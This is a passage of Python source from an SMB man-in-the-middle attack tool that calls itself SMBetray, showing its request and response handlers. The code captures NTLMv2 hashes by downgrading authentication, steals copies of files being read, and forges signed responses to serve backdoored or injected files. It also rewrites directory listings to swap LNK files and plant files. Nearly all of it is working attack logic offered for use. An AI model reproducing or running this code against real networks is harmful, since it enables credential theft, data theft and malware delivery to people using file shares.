					# this populates self.REQUEST_TRACKER[int(packet['MessageID'])] = FileRequestStruct
					self.readReq_track(requests[i])
				# Find Request
				if(requests[i]['Command'] == 14):
					# Keep track of the requested file/directory
					# this populates self.REQUEST_TRACKER[int(packet['MessageID'])] = FileRequestStruct
					self.findReq_track(requests[i])
				# GetInfo Request
				if(requests[i]['Command'] == 16):
					# Keep track of the requested file/directory
					# this populates self.REQUEST_TRACKER[int(packet['MessageID'])] = FileRequestStruct
					self.getInfoReq_track(requests[i])
			
				#<Active Attacks>#
				# Session Setup Request
				if(int(requests[i]['Command']) == 1):
					# If this is our first Session Setup 
					if len(self.NTLMV2_DATASTORE) == 0 or self.NTLMV2_DATASTORE[-1].RESPONSE_INFO['ntlm'] != '':
						# Handle the ntlmv2 negotaite
						self.sessionSetupReq_NTLMv2_Neg(requests[i])
					else:
						self.sessionSetupReq_NTLMv2_Auth(requests[i])



				if(self.KNOWN_KEY == None):
					self.hailMary_keyGeneration(copy.deepcopy(requests[i]))

				# If we didn't catch what file is being asked for, move along
				if requests[i]['MessageID'] not in self.REQUEST_TRACKER: continue

				#<Passive attacks>#
				#	Read request
				if(int(requests[i]['MessageID']) in self.REQUEST_TRACKER and requests[i]['Command'] == 8):
					# Steal a copy of the file
					self.readReq_passiveSteal(requests[i])

				#<Active attacks>#
				# If the connection is insecure, or we know the key, let's go on offence
				if((not self.SESSION_SIGNED) or (self.SESSION_SIGNED and self.KNOWN_KEY != None)):
					# Intercept some sort of request dealing with an injected file
					if(self.REQUEST_TRACKER[int(requests[i]['MessageID'])].IS_INJECTED_FILE):
						self.INJECTION_REQ_DATA[int(requests[i]['MessageID'])] = copy.deepcopy(requests[i])
						requests[i] = self.generateEchoRequest(requests[i])
						continue

					# Intercept read requests for files to be backdoored
					if(self.REQUEST_TRACKER[int(requests[i]['MessageID'])].IS_BACKDOOR_TARGET):
						self.BACKDOOR_REQ_DATA[int(requests[i]['MessageID'])] = copy.deepcopy(requests[i])
						requests[i] = self.generateEchoRequest(requests[i])
						continue

					
					

			# Rebuild the stacked packets
			return self.restackSMBChainedMessages(requests)

		except Exception, e:
			self.logger.error("[SMB2_Lib::handleRequest] " + str(traceback.format_exc()))
			return rawData
	# Gets passed the data from the SMBetray(MiTMModule) parseServerResponse function
	def handleResponse(self, rawData):	
		# time.sleep(.5)
		try:
			responses = self.splitSMBChainedMessages(rawData)
			for i in range(0, len(responses)):
				#<Required Method>#
				# Negotiate Session Response
				if(responses[i]['Command'] == 0):
					#
					self.negotiateResp_track(responses[i])
				# Create request file response
				if(responses[i]['Command'] == 5 and responses[i]['Status'] == STATUS_SUCCESS):
					# Create response
					self.createResp_track(responses[i])
				# Session Setup Response
				if(responses[i]['Command'] == 1 and responses[i]['Status'] == STATUS_SUCCESS):
					# Session Setup Response
					self.sessionSetupResp_track(responses[i])

				

				#<------PRE AUTHENTICATION SECTION ------------------------------------------------------------------------------>#
				
				#<Active attacks># 
				# 	Negotiate Response - Auth mechanism downgrade 
				if(responses[i]['Command'] == 0 and self.info['attackConfig'].AUTHMECH_DOWNGRADE):
					# They are going to use SMB 3.1.1, don't do it
					if SMB2_DIALECT_311 in self.CLIENT_INFO.SUPPORTED_DIALECTS and SMB2_DIALECT_311 in self.SERVER_INFO.SUPPORTED_DIALECTS:
						if not self.info['attackConfig'].AUTHMECH_DOWNGRADE_K311:
							self.logger.info("[Warning] Cannot downgrade 3.1.1 auth mechanisms without killing connection. Use the --K311 flag to override")
						else:
							self.logger.info("[Notice: K311] Downgrading SMB 3.1.1 to NTLMv2 (this will kill connection after auth, but we still get the hash)")
							responses[i] = self.negotiateResp_authDowngrade(responses[i])
					else:
						# SMB 3.1.1 is the only one that protects against auth downgrade attacks (except W10/2016 against \\*\SYSVOL and \\*\NETLOGON)
						responses[i] = self.negotiateResp_authDowngrade(responses[i])
				
				# Session Setup Response - authentication capture/breaking
				if(int(responses[i]['Command']) == 1):
					# Session setup NTLMv2 challenge
					if responses[i]['Status'] == nt_errors.STATUS_MORE_PROCESSING_REQUIRED:
						# Handle the ntlmv2 challenge
						self.sessionSetupResp_NTLMv2_Chal(responses[i])
					# Session setup complete
					if(responses[i]['Status'] == STATUS_SUCCESS and self.KNOWN_KEY == None):
						# Check for kerberos mutual auth
						self.sessionSetupResp_KerberosMututal(responses[i])
						# Placeholder, currently this method doesn't do anything
						self.sessionSetupResp_NTLMv2_AuthResp(responses[i])

				# All file based attacks are below this line
				if responses[i]['MessageID'] not in self.REQUEST_TRACKER: continue

				if self.KNOWN_KEY == None:
					self.hailMary_keyGeneration(copy.deepcopy(responses[i]))

				#<------POST AUTHENTICATION SECTION ------------------------------------------------------------------------------>#

				#<Passive attacks>#
				#	Read response - steal a copy of the file
				if(responses[i]['Command'] == 8 and responses[i]['Status'] == STATUS_SUCCESS and self.info['attackConfig'].PASSIVE_OUTPUT_DIR != None):
					self.readResp_passiveSteal(responses[i])

				
				#<Active Attacks>#
				#	If it's an insecure session, or we know the key
				if(self.SESSION_SIGNED == False or (self.KNOWN_KEY != None)):	
					
					# If we're completing a full masquarade of serving up faked/backdoored/modded files or directories
					if responses[i]['MessageID'] in self.INJECTION_REQ_DATA:
						pkt 					= self.INJECTION_REQ_DATA[int(responses[i]['MessageID'])]
						rspPkt 					= SMB2Packet()
						rspPkt['CreditCharge'] 	= pkt['CreditCharge']
						rspPkt['Status'] 		= 0 #Success
						rspPkt['Command'] 		= pkt['Command']
						rspPkt['CreditRequestResponse'] = pkt['CreditRequestResponse']
						rspPkt['Flags'] 		= pkt['Flags'] | SMB2_FLAGS_SERVER_TO_REDIR
						rspPkt['NextCommand'] 	= 0
						rspPkt['MessageID'] 	= pkt['MessageID']
						rspPkt['Reserved'] 		= pkt['Reserved']
						rspPkt['TreeID']		= pkt['TreeID']
						rspPkt['SessionID']		= pkt['SessionID']
						
						#Create request file - grab the name of the file we're observing
						if(pkt['Command'] == 5):
							rspPkt['Data'] = self.createResp_injectFile(pkt, self.REQUEST_TRACKER[int(responses[i]['MessageID'])])
							responses[i] = rspPkt
						#Close request file
						if(pkt['Command'] == 6):
							rspPkt['Data'] = self.closeResp_injectFile()
							responses[i] = rspPkt
						# 11 - FSCTL_CREATE_OR_GET_OBJECT_ID
						if(pkt['Command'] == 11):
							# Make shift solution for FSCTL_CREATE_OR_GET_OBJECT_ID
							# SMB2Ioctl_Response()
							rspPkt['Data'] = unhexlify("31000000c0000900160e00000800000051000000080000007000000000000000700000004000000000000000000000009ce53f462275e81180b7000c295098738404d16f300ae54fafe4750200e2ce8e9ce53f462275e81180b7000c2950987300000000000000000000000000000000")
							responses[i] = rspPkt
						#GetInfo request
						if(pkt['Command'] == 16):
							fileSize = int(self.REQUEST_TRACKER[int(responses[i]['MessageID'])].FILE_BYTE_SIZE)
							rspPkt['Data'] = self.getInfoResp_injectFile(pkt, self.REQUEST_TRACKER[int(responses[i]['MessageID'])])
							responses[i] = rspPkt
						#Read request
						if(pkt['Command'] == 8):
							rspPkt['Data'] = self.readResp_injectFile(pkt, self.REQUEST_TRACKER[int(responses[i]['MessageID'])])
							responses[i] = rspPkt

						# If we're signing stuff, then let's sign it
						if(self.SESSION_SIGNED and self.KNOWN_KEY != None):
							rspPkt['Flags'] |= SMB2_FLAGS_SIGNED
							rspPkt['Signature'] = self.KNOWN_KEY.sign(rspPkt)
					
					# If we're backdooring/swapping file content
					if responses[i]['MessageID'] in self.BACKDOOR_REQ_DATA:
						pkt 					= self.BACKDOOR_REQ_DATA[int(responses[i]['MessageID'])]
						rspPkt 					= SMB2Packet()
						rspPkt['CreditCharge'] 	= pkt['CreditCharge']
						rspPkt['Status'] 		= 0 #Success
						rspPkt['Command'] 		= pkt['Command']
						rspPkt['CreditRequestResponse'] = pkt['CreditRequestResponse']
						rspPkt['Flags'] 		= pkt['Flags'] | SMB2_FLAGS_SERVER_TO_REDIR
						rspPkt['NextCommand'] 	= 0
						rspPkt['MessageID'] 	= pkt['MessageID']
						rspPkt['Reserved'] 		= pkt['Reserved']
						rspPkt['TreeID']		= pkt['TreeID']
						rspPkt['SessionID']		= pkt['SessionID']
						
						#Create request file - grab the name of the file we're observing
						if(pkt['Command'] == 5):
							rspPkt['Data'] = self.createResp_injectFile(pkt, self.REQUEST_TRACKER[int(responses[i]['MessageID'])])
							responses[i] = rspPkt
						#Close request file
						if(pkt['Command'] == 6):
							rspPkt['Data'] = self.closeResp_injectFile()
							responses[i] = rspPkt
						# 11 - FSCTL_CREATE_OR_GET_OBJECT_ID
						if(pkt['Command'] == 11):
							# Make shift solution for FSCTL_CREATE_OR_GET_OBJECT_ID
							rspPkt['Data'] = unhexlify("31000000c0000900160e00000800000051000000080000007000000000000000700000004000000000000000000000009ce53f462275e81180b7000c295098738404d16f300ae54fafe4750200e2ce8e9ce53f462275e81180b7000c2950987300000000000000000000000000000000")
							responses[i] = rspPkt
						#GetInfo request
						if(pkt['Command'] == 16):
							rspPkt['Data'] = self.getInfoResp_injectFile(pkt, self.REQUEST_TRACKER[int(responses[i]['MessageID'])])
							responses[i] = rspPkt
						#Read request
						if(pkt['Command'] == 8):
							rspPkt['Data'] = self.readResp_injectFile(pkt, self.REQUEST_TRACKER[int(responses[i]['MessageID'])])
							responses[i] = rspPkt

						# If we're signing stuff, then let's sign it
						if(self.SESSION_SIGNED and self.KNOWN_KEY != None):
							rspPkt['Flags'] |= SMB2_FLAGS_SIGNED
							rspPkt['Signature'] = self.KNOWN_KEY.sign(rspPkt)

					# GetInfo response - spoof it if we're backdooring stuff
					if(responses[i]['Command'] == 16):
						fname = self.REQUEST_TRACKER[responses[i]['MessageID']].FILE_NAME.lower()
						fname = fname[fname.rfind("\\", 0, len(fname))+1:]
						# If we're backdooring files by name
						if fname in self.BACKDOOR_FILE_SWAP_LIBRARY:
							rspPkt['Data'] = self.getInfoResp_injectFile(pkt, self.REQUEST_TRACKER[int(responses[i]['MessageID'])])
							responses[i] = rspPkt
							continue
						# If we're backdooring extensions
						ext = fname[fname.find(".")+1:]
						if ext in self.BACKDOOR_EXT_SWAP_LIBRARY:
							rspPkt['Data'] = self.getInfoResp_injectFile(pkt, self.REQUEST_TRACKER[int(responses[i]['MessageID'])])
							responses[i] = rspPkt
							continue

					

					# Directory listing injection
					if(responses[i]['Command'] == 14 and responses[i]['Status'] == STATUS_SUCCESS):			
						if responses[i]['MessageID'] in self.FILE_INFO_CLASS_TRACKER:
							if self.info['attackConfig'].LNK_SWAP_ALL != None:
								# self.logger.info("Swapping lnks..")
								responses[i] = self.findResp_lnkSwapAll(responses[i], self.FILE_INFO_CLASS_TRACKER[responses[i]['MessageID']])

							if self.info['attackConfig'].LNK_SWAP_EXEC_ONLY != None:
								responses[i] = self.findResp_lnkSwapExec(responses[i], self.FILE_INFO_CLASS_TRACKER[responses[i]['MessageID']])

							# Check if there are any filename with extensions that we want to backdoor in the directory listing
							if self.info['attackConfig'].EXTENSION_SWAP_DIR != None:
								responses[i] = self.findResp_backdoorFileExtensionModifyListing(responses[i], self.FILE_INFO_CLASS_TRACKER[responses[i]['MessageID']])

							# Check if there are any filenames that we want to backdoor in the directory listing
							if self.info['attackConfig'].FILENAME_SWAP_DIR != None:
								responses[i] = self.findResp_backdoorFileNameModifyListing(responses[i], self.FILE_INFO_CLASS_TRACKER[responses[i]['MessageID']])

							# Add every file to the directory listing
							for guid,fileStruct in self.INJECT_FILE_LIBRARY.iteritems():
								responses[i] = self.findResp_injectFileListing(responses[i], fileStruct, self.FILE_INFO_CLASS_TRACKER[responses[i]['MessageID']])



			# Rebuild the stacked packets
			return self.restackSMBChainedMessages(responses, as_client = False)

		except Exception, e:
			self.logger.error("[SMB2_Lib::handleResponse] " + str(traceback.format_exc()))
			return rawData
